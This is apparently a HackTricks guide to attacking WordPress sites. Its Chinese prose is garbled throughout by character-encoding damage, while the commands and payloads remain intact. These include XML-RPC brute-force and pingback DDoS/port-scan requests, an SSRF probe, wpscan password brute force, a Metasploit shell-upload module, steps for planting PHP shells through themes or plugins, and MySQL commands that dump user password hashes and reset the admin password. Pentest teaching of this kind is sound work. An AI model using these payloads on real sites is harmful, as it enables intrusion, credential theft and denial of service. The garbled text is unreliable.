# Wordpress

{{#include ../../banners/hacktricks-training.md}}

## åŸºæœ¬ä¿¡æ¯

- **Uploaded** æ–‡ä»¶ä¼šè¢«å­˜æ”¾åˆ°: `http://10.10.10.10/wp-content/uploads/2018/08/a.txt`
- **Themes æ–‡ä»¶å¯ä»¥åœ¨ /wp-content/themes/ æ‰¾åˆ°,** æ‰€ä»¥å¦‚æœä½ ä¿®æ”¹ä¸»é¢˜çš„æŸäº› php æ¥è·å– RCEï¼Œä½ å¾ˆå¯èƒ½ä¼šä½¿ç”¨è¯¥è·¯å¾„ã€‚ä¾‹å¦‚ï¼šä½¿ç”¨ **theme twentytwelve** ä½ å¯ä»¥ **è®¿é—®** **404.php** æ–‡ä»¶äº: [**/wp-content/themes/twentytwelve/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- **å¦ä¸€ä¸ªæœ‰ç”¨çš„ url å¯èƒ½æ˜¯ï¼š** [**/wp-content/themes/default/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- åœ¨ **wp-config.php** ä¸­ä½ å¯ä»¥æ‰¾åˆ°æ•°æ®åº“çš„ root å¯†ç ã€‚
- é»˜è®¤è¦æ£€æŸ¥çš„ç™»å½•è·¯å¾„ï¼š _**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**_

### **ä¸»è¦ WordPress æ–‡ä»¶**

- `index.php`
- `license.txt` åŒ…å«æœ‰ç”¨çš„ä¿¡æ¯ï¼Œæ¯”å¦‚å®‰è£…çš„ WordPress ç‰ˆæœ¬ã€‚
- `wp-activate.php` ç”¨äºåœ¨è®¾ç½®æ–°çš„ WordPress ç«™ç‚¹æ—¶çš„ç”µå­é‚®ä»¶æ¿€æ´»æµç¨‹ã€‚
- ç™»å½•è·¯å¾„ï¼ˆå¯èƒ½è¢«é‡å‘½åä»¥éšè—ï¼‰:
- `/wp-admin/login.php`
- `/wp-admin/wp-login.php`
- `/login.php`
- `/wp-login.php`
- `xmlrpc.php` æ˜¯ä¸€ä¸ªæ–‡ä»¶ï¼Œä»£è¡¨äº† WordPress çš„ä¸€ä¸ªåŠŸèƒ½ï¼Œå…è®¸é€šè¿‡ HTTP ä½œä¸ºä¼ è¾“æœºåˆ¶å’Œ XML ä½œä¸ºç¼–ç æœºåˆ¶æ¥ä¼ è¾“æ•°æ®ã€‚è¿™ç§é€šä¿¡æ–¹å¼å·²ç»è¢« WordPress çš„ [REST API](https://developer.wordpress.org/rest-api/reference) æ‰€æ›¿ä»£ã€‚
- `wp-content` æ–‡ä»¶å¤¹æ˜¯å­˜æ”¾ plugins å’Œ themes çš„ä¸»è¦ç›®å½•ã€‚
- `wp-content/uploads/` æ˜¯å­˜æ”¾æ‰€æœ‰ä¸Šä¼ åˆ°å¹³å°çš„æ–‡ä»¶çš„ç›®å½•ã€‚
- `wp-includes/` æ˜¯å­˜æ”¾æ ¸å¿ƒæ–‡ä»¶çš„ç›®å½•ï¼Œä¾‹å¦‚è¯ä¹¦ã€å­—ä½“ã€JavaScript æ–‡ä»¶å’Œ widgetsã€‚
- `wp-sitemap.xml` åœ¨ WordPress 5.5 åŠæ›´é«˜ç‰ˆæœ¬ä¸­ï¼ŒWordPress ä¼šç”Ÿæˆä¸€ä¸ª sitemap XML æ–‡ä»¶ï¼ŒåŒ…å«æ‰€æœ‰å…¬å¼€çš„æ–‡ç« ä»¥åŠå¯å…¬å¼€æŸ¥è¯¢çš„æ–‡ç« ç±»å‹å’Œåˆ†ç±»æ³•ã€‚

**åæ¸—é€ (Post exploitation)**

- `wp-config.php` æ–‡ä»¶åŒ…å« WordPress è¿æ¥æ•°æ®åº“æ‰€éœ€çš„ä¿¡æ¯ï¼Œä¾‹å¦‚æ•°æ®åº“åã€æ•°æ®åº“ä¸»æœºã€ç”¨æˆ·åå’Œå¯†ç ã€authentication keys and saltsï¼Œä»¥åŠæ•°æ®åº“è¡¨å‰ç¼€ã€‚è¯¥é…ç½®æ–‡ä»¶è¿˜å¯ä»¥ç”¨äºå¯ç”¨ DEBUG æ¨¡å¼ï¼Œè¿™åœ¨æ•…éšœæ’æŸ¥æ—¶éå¸¸æœ‰ç”¨ã€‚

### ç”¨æˆ·æƒé™

- **Administrator**
- **Editor**: å‘å¸ƒå¹¶ç®¡ç†ä»–äººå’Œè‡ªå·±çš„æ–‡ç« 
- **Author**: å‘å¸ƒå¹¶ç®¡ç†è‡ªå·±çš„æ–‡ç« 
- **Contributor**: æ’°å†™å¹¶ç®¡ç†è‡ªå·±çš„æ–‡ç« ä½†æ— æ³•å‘å¸ƒ
- **Subscriber**: æµè§ˆæ–‡ç« å¹¶ç¼–è¾‘è‡ªå·±çš„ä¸ªäººèµ„æ–™

## **è¢«åŠ¨æšä¸¾**

### **è·å– WordPress ç‰ˆæœ¬**

æ£€æŸ¥æ˜¯å¦èƒ½æ‰¾åˆ°æ–‡ä»¶ `/license.txt` æˆ– `/readme.html`

åœ¨é¡µé¢çš„ **æºç ** ä¸­ï¼ˆç¤ºä¾‹æ¥è‡ª [https://wordpress.org/support/article/pages/](https://wordpress.org/support/article/pages/)ï¼‰:

- grep
```bash
curl https://victim.com/ | grep 'content="WordPress'
```
- `meta name`

![](<../../images/image (1111).png>)

- CSS é“¾æ¥æ–‡ä»¶

![](<../../images/image (533).png>)

- JavaScript æ–‡ä»¶

![](<../../images/image (524).png>)

### è·å–æ’ä»¶
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### è·å–ä¸»é¢˜
```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### é€šç”¨æ–¹å¼æå–ç‰ˆæœ¬ä¿¡æ¯
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

```
## ä¸»åŠ¨æšä¸¾

### æ’ä»¶å’Œä¸»é¢˜

ä½ å¯èƒ½æ— æ³•æ‰¾åˆ°æ‰€æœ‰å¯ç”¨çš„æ’ä»¶å’Œä¸»é¢˜ã€‚ä¸ºäº†å‘ç°æ‰€æœ‰å®ƒä»¬ï¼Œä½ éœ€è¦ **actively Brute Force a list of Plugins and Themes**ï¼ˆå¹¸å¥½æˆ‘ä»¬æœ‰åŒ…å«è¿™äº›åˆ—è¡¨çš„è‡ªåŠ¨åŒ–å·¥å…·ï¼‰ã€‚

### ç”¨æˆ·

- **ID Brute:** ä½ å¯ä»¥é€šè¿‡ Brute Forcing users IDs ä» WordPress site è·å–æœ‰æ•ˆç”¨æˆ·ï¼š
```bash
curl -s -I -X GET http://blog.example.com/?author=1
```
å¦‚æœå“åº”æ˜¯ **200** æˆ– **30X**ï¼Œè¿™æ„å‘³ç€è¯¥ id æ˜¯ **æœ‰æ•ˆçš„**ã€‚å¦‚æœå“åº”æ˜¯ **400**ï¼Œåˆ™è¯¥ id æ˜¯ **æ— æ•ˆçš„**ã€‚

- **wp-json:** ä½ ä¹Ÿå¯ä»¥å°è¯•é€šè¿‡æŸ¥è¯¢æ¥è·å–å…³äºç”¨æˆ·çš„ä¿¡æ¯ï¼š
```bash
curl http://blog.example.com/wp-json/wp/v2/users
```
å¦ä¸€ä¸ªå¯èƒ½æ³„éœ²ä¸€äº›ç”¨æˆ·ä¿¡æ¯çš„ `/wp-json/` ç«¯ç‚¹æ˜¯ï¼š
```bash
curl http://blog.example.com/wp-json/oembed/1.0/embed?url=POST-URL
```
æ³¨æ„ï¼Œè¯¥ endpoint ä»…ä¼šæš´éœ²æ›¾å‘è¡¨è¿‡ post çš„ç”¨æˆ·ã€‚**åªä¼šæä¾›å·²å¯ç”¨æ­¤åŠŸèƒ½çš„ç”¨æˆ·çš„ä¿¡æ¯**ã€‚

å¦å¤–è¯·æ³¨æ„ï¼Œ**/wp-json/wp/v2/pages** å¯èƒ½ä¼š leak IP åœ°å€ã€‚

- **Login username enumeration**: åœ¨é€šè¿‡ **`/wp-login.php`** ç™»å½•æ—¶ï¼Œæ˜¾ç¤ºçš„ **æ¶ˆæ¯** ä¼š **ä¸åŒ**ï¼Œä»¥æŒ‡ç¤º **ç”¨æˆ·åæ˜¯å¦å­˜åœ¨**ã€‚

### XML-RPC

å¦‚æœ `xml-rpc.php` å¯ç”¨ï¼Œæ‚¨å¯ä»¥æ‰§è¡Œ credentials brute-forceï¼Œæˆ–åˆ©ç”¨å®ƒå¯¹å…¶ä»–èµ„æºå‘èµ· DoS æ”»å‡»ã€‚ (You can automate this process[ using this](https://github.com/relarizky/wpxploit) for example).

è¦æ£€æŸ¥å®ƒæ˜¯å¦å¯ç”¨ï¼Œå°è¯•è®¿é—® _**/xmlrpc.php**_ å¹¶å‘é€ä»¥ä¸‹è¯·æ±‚ï¼š

**æ£€æŸ¥**
```html
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
![](https://h3llwings.files.wordpress.com/2019/01/list-of-functions.png?w=656)

**Credentials Bruteforce**

**`wp.getUserBlogs`**, **`wp.getCategories`** æˆ– **`metaWeblog.getUsersBlogs`** æ˜¯ä¸€äº›å¯ä»¥ç”¨æ¥ brute-force credentials çš„æ–¹æ³•ã€‚å¦‚æœä½ èƒ½æ‰¾åˆ°å…¶ä¸­ä»»ä½•ä¸€ä¸ªï¼Œä½ å¯ä»¥å‘é€ç±»ä¼¼å¦‚ä¸‹çš„å†…å®¹ï¼š
```html
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```
å¦‚æœ credentials æ— æ•ˆï¼Œ200 code response å†…åº”è¯¥å‡ºç°æ¶ˆæ¯ _"Incorrect username or password"_ã€‚

![](<../../images/image (107) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (4) (1).png>)

![](<../../images/image (721).png>)

ä½¿ç”¨æ­£ç¡®çš„ credentials å¯ä»¥ upload a fileã€‚åœ¨ response ä¸­ä¼šæ˜¾ç¤º path ([https://gist.github.com/georgestephanis/5681982](https://gist.github.com/georgestephanis/5681982))
```html
<?xml version='1.0' encoding='utf-8'?>
<methodCall>
<methodName>wp.uploadFile</methodName>
<params>
<param><value><string>1</string></value></param>
<param><value><string>username</string></value></param>
<param><value><string>password</string></value></param>
<param>
<value>
<struct>
<member>
<name>name</name>
<value><string>filename.jpg</string></value>
</member>
<member>
<name>type</name>
<value><string>mime/type</string></value>
</member>
<member>
<name>bits</name>
<value><base64><![CDATA[---base64-encoded-data---]]></base64></value>
</member>
</struct>
</value>
</param>
</params>
</methodCall>
```
æ­¤å¤–ï¼Œè¿˜æœ‰ä¸€ç§ä½¿ç”¨ **`system.multicall`** æ¥æ›´å¿«é€Ÿæš´åŠ›ç ´è§£å‡­æ®çš„æ–¹æ³•ï¼Œå› ä¸ºä½ å¯ä»¥åœ¨åŒä¸€ä¸ªè¯·æ±‚ä¸­å°è¯•å¤šä¸ªå‡­æ®ï¼š

<figure><img src="../../images/image (628).png" alt=""><figcaption></figcaption></figure>

**Bypass 2FA**

æœ¬æ–¹æ³•é¢å‘ç¨‹åºè€Œéäººå·¥ï¼Œä¸”è¾ƒä¸ºè€æ—§ï¼Œå› æ­¤ä¸æ”¯æŒ 2FAã€‚ æ‰€ä»¥ï¼Œå¦‚æœä½ æœ‰æœ‰æ•ˆçš„ creds ä½†ä¸»å…¥å£å— 2FA ä¿æŠ¤ï¼Œ**ä½ å¯èƒ½èƒ½å¤Ÿæ»¥ç”¨ xmlrpc.php ä½¿ç”¨è¿™äº›å‡­æ®ç™»å½•ï¼Œä»è€Œç»•è¿‡ 2FA**ã€‚æ³¨æ„ï¼Œä½ æ— æ³•æ‰§è¡Œé€šè¿‡æ§åˆ¶å°å¯ä»¥å®Œæˆçš„æ‰€æœ‰æ“ä½œï¼Œä½†ä½ ä»å¯èƒ½è·å¾— RCEï¼Œæ­£å¦‚ Ippsec åœ¨ [https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s](https://www.youtube.com/watch?v=p8mIdm93mfw&t=1130s) æ‰€è§£é‡Šçš„ã€‚

**DDoS or port scanning**

å¦‚æœä½ èƒ½åœ¨æ–¹æ³•åˆ—è¡¨ä¸­æ‰¾åˆ° _**pingback.ping**_ï¼Œä½ å¯ä»¥è®© Wordpress å‘ä»»æ„ä¸»æœº/ç«¯å£å‘é€ä»»æ„è¯·æ±‚ã€‚\
è¿™å¯ä»¥ç”¨æ¥è®© **æˆåƒä¸Šä¸‡** ä¸ª Wordpress **ç«™ç‚¹** **è®¿é—®** åŒä¸€ **ä½ç½®**ï¼ˆä»è€Œåœ¨è¯¥ä½ç½®é€ æˆ **DDoS**ï¼‰ï¼Œæˆ–è€…ä½ å¯ä»¥ç”¨å®ƒè®© **Wordpress** **æ‰«æ** æŸäº›å†…éƒ¨ **ç½‘ç»œ**ï¼ˆä½ å¯ä»¥æŒ‡å®šä»»æ„ç«¯å£ï¼‰ã€‚
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```
![](../../images/1_JaUYIZF8ZjDGGB7ocsZC-g.png)

å¦‚æœä½ å¾—åˆ° **faultCode** çš„å€¼ **å¤§äº** **0**ï¼ˆ17ï¼‰ï¼Œè¿™æ„å‘³ç€ port æ˜¯å¼€æ”¾çš„ã€‚

æŸ¥çœ‹ä¸Šä¸€èŠ‚ä¸­ **`system.multicall`** çš„ç”¨æ³•ï¼Œäº†è§£å¦‚ä½•æ»¥ç”¨æ­¤æ–¹æ³•æ¥å¼•å‘ DDoSã€‚

**DDoS**
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://target/</string></value></param>
<param><value><string>http://yoursite.com/and_some_valid_blog_post_url</string></value></param>
</params>
</methodCall>
```
![](<../../images/image (110).png>)

### wp-cron.php DoS

æ­¤æ–‡ä»¶é€šå¸¸ä½äº WordPress ç«™ç‚¹æ ¹ç›®å½•ï¼š **`/wp-cron.php`**\
å½“æ­¤æ–‡ä»¶è¢« **è®¿é—®** æ—¶ï¼Œä¼šæ‰§è¡Œä¸€æ¬¡â€œ**ç¹é‡**â€çš„ MySQL **æŸ¥è¯¢**ï¼Œå› æ­¤å¯èƒ½è¢« **attackers** ç”¨æ¥ **cause** ä¸€ä¸ª **DoS**ã€‚\
æ­¤å¤–ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼Œ`wp-cron.php` åœ¨æ¯æ¬¡é¡µé¢åŠ è½½æ—¶éƒ½ä¼šè¢«è°ƒç”¨ï¼ˆä»»ä½•å®¢æˆ·ç«¯è¯·æ±‚ä»»ä½• WordPress é¡µé¢æ—¶ï¼‰ï¼Œåœ¨é«˜æµé‡ç«™ç‚¹ä¸Šè¿™å¯èƒ½ä¼šå¯¼è‡´é—®é¢˜ï¼ˆDoSï¼‰ã€‚

å»ºè®®ç¦ç”¨ Wp-Cron å¹¶åœ¨ä¸»æœºå†…åˆ›å»ºä¸€ä¸ªçœŸå®çš„ cronjobï¼Œä»¥å›ºå®šé—´éš”æ‰§è¡Œæ‰€éœ€æ“ä½œï¼ˆé¿å…é€ æˆé—®é¢˜ï¼‰ã€‚

### /wp-json/oembed/1.0/proxy - SSRF

å°è¯•è®¿é—® _https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net_ï¼ŒWordPress ç«™ç‚¹å¯èƒ½ä¼šå‘ä½ å‘èµ·è¯·æ±‚ã€‚

This is the response when it doesn't work:

![](<../../images/image (365).png>)

## SSRF


{{#ref}}
https://github.com/t0gu/quickpress/blob/master/core/requests.go
{{#endref}}

è¯¥å·¥å…·æ£€æŸ¥æ˜¯å¦å­˜åœ¨ **methodName: pingback.ping** ä»¥åŠè·¯å¾„ **/wp-json/oembed/1.0/proxy**ï¼Œå¦‚æœå­˜åœ¨ï¼Œåˆ™å°è¯•åˆ©ç”¨å®ƒä»¬ã€‚

## Automatic Tools
```bash
cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com [--plugins-detection aggressive] --api-token <API_TOKEN> --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt #Brute force found users and search for vulnerabilities using a free API token (up 50 searchs)
#You can try to bruteforce the admin user using wpscan with "-U admin"
```
## é€šè¿‡è¦†å†™ä¸€ä¸ªä½è·å–è®¿é—®æƒé™

ä¸å…¶è¯´æ˜¯çœŸå®æ”»å‡»ï¼Œä¸å¦‚è¯´æ˜¯ä¸ªå¥½ç©çš„å®éªŒã€‚åœ¨ CTF [https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man] ä¸­ï¼Œä½ å¯ä»¥ç¿»è½¬ä»»æ„ wordpress æ–‡ä»¶çš„ 1 bitã€‚å› æ­¤ï¼Œä½ å¯ä»¥ç¿»è½¬æ–‡ä»¶ `/var/www/html/wp-includes/user.php` ä¸­ä½ç½® `5389` çš„ä½ï¼Œä»è€Œå°† NOT (`!`) æ“ä½œ NOP æ‰ã€‚
```php
if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
return new WP_Error(
```
## **é¢æ¿ RCE**

**ä¿®æ”¹æ‰€ä½¿ç”¨ä¸»é¢˜ä¸­çš„ phpï¼ˆéœ€è¦ admin credentialsï¼‰**

å¤–è§‚ â†’ ä¸»é¢˜ç¼–è¾‘å™¨ â†’ 404 æ¨¡æ¿ï¼ˆåœ¨å³ä¾§ï¼‰

å°†å†…å®¹æ›´æ”¹ä¸º php shellï¼š

![](<../../images/image (384).png>)

åœ¨ç½‘ä¸Šæœç´¢å¦‚ä½•è®¿é—®è¯¥å·²æ›´æ–°é¡µé¢ã€‚æœ¬ä¾‹ä¸­ä½ éœ€è¦è®¿é—®è¿™é‡Œ: [http://10.11.1.234/wp-content/themes/twentytwelve/404.php](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

### MSF

ä½ å¯ä»¥ä½¿ç”¨ï¼š
```bash
use exploit/unix/webapp/wp_admin_shell_upload
```
ä»¥è·å–ä¼šè¯ã€‚

## æ’ä»¶ RCE

### PHP æ’ä»¶

å¯èƒ½å¯ä»¥å°† .php æ–‡ä»¶ä½œä¸ºæ’ä»¶ä¸Šä¼ ã€‚\
ä¸¾ä¾‹åˆ›å»ºä½ çš„ php åé—¨ï¼Œä¾‹å¦‚ï¼š

![](<../../images/image (183).png>)

ç„¶åæ·»åŠ ä¸€ä¸ªæ–°çš„æ’ä»¶ï¼š

![](<../../images/image (722).png>)

ä¸Šä¼ æ’ä»¶å¹¶æŒ‰ Install Now:

![](<../../images/image (249).png>)

ç‚¹å‡» Procced:

![](<../../images/image (70).png>)

è¡¨é¢ä¸Šçœ‹è¿™å¯èƒ½ä¸ä¼šæœ‰ä»»ä½•ååº”ï¼Œä½†å¦‚æœä½ è½¬åˆ° Mediaï¼Œä½ ä¼šçœ‹åˆ°ä½ çš„ shell å·²ä¸Šä¼ ï¼š

![](<../../images/image (462).png>)

è®¿é—®å®ƒï¼Œä½ ä¼šçœ‹åˆ°ç”¨äºæ‰§è¡Œ reverse shell çš„ URLï¼š

![](<../../images/image (1006).png>)

### ä¸Šä¼ å¹¶æ¿€æ´»æ¶æ„æ’ä»¶

æ­¤æ–¹æ³•æ¶‰åŠå®‰è£…å·²çŸ¥å­˜åœ¨æ¼æ´çš„æ¶æ„æ’ä»¶å¹¶åˆ©ç”¨å®ƒè·å– web shellã€‚è¯¥è¿‡ç¨‹é€šè¿‡ WordPress ä»ªè¡¨æ¿æŒ‰å¦‚ä¸‹æ–¹å¼è¿›è¡Œï¼š

1. **æ’ä»¶è·å–**: æ’ä»¶ä»åƒ Exploit DB è¿™æ ·çš„æ¥æºè·å–ï¼Œä¾‹å¦‚ [**here**](https://www.exploit-db.com/exploits/36374).
2. **æ’ä»¶å®‰è£…**:
- å¯¼èˆªåˆ° WordPress ä»ªè¡¨æ¿ï¼Œç„¶åå‰å¾€ `Dashboard > Plugins > Upload Plugin`.
- ä¸Šä¼ ä¸‹è½½çš„æ’ä»¶çš„ zip æ–‡ä»¶ã€‚
3. **æ’ä»¶æ¿€æ´»**: æ’ä»¶æˆåŠŸå®‰è£…åï¼Œå¿…é¡»é€šè¿‡ä»ªè¡¨æ¿æ¿€æ´»ã€‚
4. **åˆ©ç”¨**:
- å®‰è£…å¹¶æ¿€æ´»æ’ä»¶ "reflex-gallery" åï¼Œå¯ä»¥å¯¹å…¶è¿›è¡Œåˆ©ç”¨ï¼Œå› ä¸ºå®ƒå·²çŸ¥å­˜åœ¨æ¼æ´ã€‚
- Metasploit framework æä¾›äº†è¯¥æ¼æ´çš„åˆ©ç”¨æ¨¡å—ã€‚é€šè¿‡åŠ è½½ç›¸åº”æ¨¡å—å¹¶æ‰§è¡Œç‰¹å®šå‘½ä»¤ï¼Œå¯ä»¥å»ºç«‹ meterpreter ä¼šè¯ï¼Œä»è€Œè·å¾—å¯¹ç«™ç‚¹çš„æœªæˆæƒè®¿é—®ã€‚
- æ³¨æ„ï¼Œè¿™åªæ˜¯åˆ©ç”¨ WordPress ç«™ç‚¹çš„ä¼—å¤šæ–¹æ³•ä¹‹ä¸€ã€‚

å†…å®¹åŒ…å«åœ¨ WordPress ä»ªè¡¨æ¿ä¸­å®‰è£…å¹¶æ¿€æ´»æ’ä»¶æ­¥éª¤çš„ç¤ºæ„å›¾ã€‚ç„¶è€Œï¼Œè¯·æ³¨æ„ï¼Œåœ¨æ²¡æœ‰é€‚å½“æˆæƒçš„æƒ…å†µä¸‹ä»¥è¿™ç§æ–¹å¼åˆ©ç”¨æ¼æ´æ˜¯éæ³•ä¸”ä¸é“å¾·çš„ã€‚æ­¤ä¿¡æ¯åº”è´Ÿè´£ä»»åœ°ä½¿ç”¨ï¼Œå¹¶ä¸”ä»…åœ¨åˆæ³•åœºæ™¯ä¸­ï¼Œä¾‹å¦‚å…·æœ‰æ˜ç¡®è®¸å¯çš„ penetration testingã€‚

**For more detailed steps check:** [**https://www.hackingarticles.in/wordpress-reverse-shell/**](https://www.hackingarticles.in/wordpress-reverse-shell/)

## ä» XSS åˆ° RCE

- [**WPXStrike**](https://github.com/nowak0x01/WPXStrike): _**WPXStrike**_ æ˜¯ä¸€ä¸ªè„šæœ¬ï¼Œæ—¨åœ¨å°† **Cross-Site Scripting (XSS)** æ¼æ´å‡çº§ä¸º **Remote Code Execution (RCE)** æˆ–å…¶å®ƒ WordPress çš„ä¸¥é‡æ¼æ´ã€‚æ›´å¤šä¿¡æ¯è§ [**this post**](https://nowak0x01.github.io/papers/76bc0832a8f682a7e0ed921627f85d1d.html). å®ƒä¸º Wordpress ç‰ˆæœ¬ 6.X.Xã€5.X.X å’Œ 4.X.X æä¾›æ”¯æŒï¼Œå¹¶å…è®¸ï¼š
- _**æƒé™æå‡ï¼š**_ åœ¨ WordPress ä¸­åˆ›å»ºç”¨æˆ·ã€‚
- _**(RCE) è‡ªå®šä¹‰æ’ä»¶ï¼ˆåé—¨ï¼‰ä¸Šä¼ ï¼š**_ å°†ä½ çš„è‡ªå®šä¹‰æ’ä»¶ï¼ˆåé—¨ï¼‰ä¸Šä¼ åˆ° WordPressã€‚
- _**(RCE) å†…ç½®æ’ä»¶ç¼–è¾‘ï¼š**_ ç¼–è¾‘ WordPress ä¸­çš„å†…ç½®æ’ä»¶ã€‚
- _**(RCE) å†…ç½®ä¸»é¢˜ç¼–è¾‘ï¼š**_ ç¼–è¾‘ WordPress ä¸­çš„å†…ç½®ä¸»é¢˜ã€‚
- _**(Custom) è‡ªå®šä¹‰åˆ©ç”¨ï¼š**_ é’ˆå¯¹ç¬¬ä¸‰æ–¹ WordPress æ’ä»¶/ä¸»é¢˜çš„è‡ªå®šä¹‰åˆ©ç”¨ã€‚

## ååˆ©ç”¨

æå–ç”¨æˆ·åå’Œå¯†ç ï¼š
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
```
æ›´æ”¹ admin password:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
```
## Wordpress æ’ä»¶ Pentest

### æ”»å‡»é¢

äº†è§£ Wordpress æ’ä»¶å¦‚ä½•æš´éœ²åŠŸèƒ½å¯¹äºå‘ç°å…¶åŠŸèƒ½æ€§æ¼æ´è‡³å…³é‡è¦ã€‚ä½ å¯ä»¥åœ¨ä¸‹é¢çš„è¦ç‚¹ä¸­æ‰¾åˆ°æ’ä»¶å¯èƒ½æš´éœ²åŠŸèƒ½çš„æ–¹å¼ï¼Œä»¥åŠ[**this blog post**](https://nowotarski.info/wordpress-nonce-authorization/) ä¸­çš„ä¸€äº›æ˜“å—æ”»å‡»æ’ä»¶ç¤ºä¾‹ã€‚

- **`wp_ajax`**

æ’ä»¶å°†å‡½æ•°æš´éœ²ç»™ç”¨æˆ·çš„æ–¹æ³•ä¹‹ä¸€æ˜¯é€šè¿‡ AJAX å¤„ç†ç¨‹åºã€‚è¿™äº›å¤„ç†ç¨‹åºå¯èƒ½åŒ…å«é€»è¾‘ã€æˆæƒæˆ–è®¤è¯æ¼æ´ã€‚æ­¤å¤–ï¼Œè¿™ç±»å‡½æ•°ç»å¸¸åŒæ—¶å°†è®¤è¯å’Œæˆæƒçš„ä¾æ®æ”¾åœ¨ wordpress nonce çš„å­˜åœ¨ä¸Šï¼Œè€Œ **ä»»ä½•åœ¨è¯¥ Wordpress å®ä¾‹ä¸­å·²è®¤è¯çš„ç”¨æˆ·éƒ½å¯èƒ½æ‹¥æœ‰è¯¥ nonce**ï¼ˆä¸å…¶è§’è‰²æ— å…³ï¼‰ã€‚

ä»¥ä¸‹æ˜¯å¯ç”¨äºåœ¨æ’ä»¶ä¸­æš´éœ²å‡½æ•°çš„å‡½æ•°ï¼š
```php
add_action( 'wp_ajax_action_name', array(&$this, 'function_name'));
add_action( 'wp_ajax_nopriv_action_name', array(&$this, 'function_name'));
```
**ä½¿ç”¨ `nopriv` ä¼šä½¿è¯¥ç«¯ç‚¹å¯¹ä»»ä½•ç”¨æˆ·å¯è®¿é—®ï¼ˆç”šè‡³æœªè®¤è¯çš„ç”¨æˆ·ï¼‰ã€‚**

> [!CAUTION]
> æ­¤å¤–ï¼Œå¦‚æœå‡½æ•°åªæ˜¯é€šè¿‡ `wp_verify_nonce` æ£€æŸ¥ç”¨æˆ·çš„æˆæƒï¼Œè¿™ä¸ªå‡½æ•°åªä¼šæ£€æŸ¥ç”¨æˆ·æ˜¯å¦å·²ç™»å½•ï¼Œé€šå¸¸ä¸ä¼šæ£€æŸ¥ç”¨æˆ·çš„è§’è‰²ã€‚å› æ­¤ä½æƒé™ç”¨æˆ·å¯èƒ½èƒ½è®¿é—®é«˜æƒé™æ“ä½œã€‚

- **REST API**

ä¹Ÿå¯ä»¥é€šè¿‡åœ¨ wordpress ä¸­ä½¿ç”¨ `register_rest_route` å‡½æ•°æ³¨å†Œ REST API æ¥æš´éœ²å‡½æ•°ï¼š
```php
register_rest_route(
$this->namespace, '/get/', array(
'methods' => WP_REST_Server::READABLE,
'callback' => array($this, 'getData'),
'permission_callback' => '__return_true'
)
);
```
The `permission_callback` is a callback to function that checks if a given user is authorized to call the API method.

**If the built-in `__return_true` function is used, it'll simply skip user permissions check.**

- **ç›´æ¥è®¿é—® php æ–‡ä»¶**

å½“ç„¶ï¼ŒWordpress ä½¿ç”¨ PHPï¼Œæ’ä»¶å†…çš„æ–‡ä»¶å¯ä»¥ç›´æ¥é€šè¿‡ web è®¿é—®ã€‚å› æ­¤ï¼Œå¦‚æœæŸä¸ªæ’ä»¶æš´éœ²äº†ä»»ä½•ä»…é€šè¿‡è®¿é—®è¯¥æ–‡ä»¶å³å¯è§¦å‘çš„æ˜“å—æ”»å‡»åŠŸèƒ½ï¼Œé‚£ä¹ˆä»»ä½•ç”¨æˆ·éƒ½å¯ä»¥åˆ©ç”¨å®ƒã€‚

### Trusted-header REST impersonation (WooCommerce Payments â‰¤ 5.6.1)

ä¸€äº›æ’ä»¶ä¸ºå†…éƒ¨é›†æˆæˆ– reverse proxies å®ç°äº† â€œtrusted headerâ€ æ·å¾„ï¼Œç„¶åä½¿ç”¨è¯¥ header ä¸º REST è¯·æ±‚è®¾ç½®å½“å‰ç”¨æˆ·ä¸Šä¸‹æ–‡ã€‚å¦‚æœè¯¥ header æœªè¢«ä¸Šæ¸¸ç»„ä»¶ä»¥åŠ å¯†æ–¹å¼ç»‘å®šåˆ°è¯·æ±‚ï¼Œæ”»å‡»è€…å¯ä»¥ä¼ªé€ å®ƒï¼Œå¹¶ä»¥ç®¡ç†å‘˜èº«ä»½è®¿é—®æœ‰ç‰¹æƒçš„ REST è·¯ç”±ã€‚

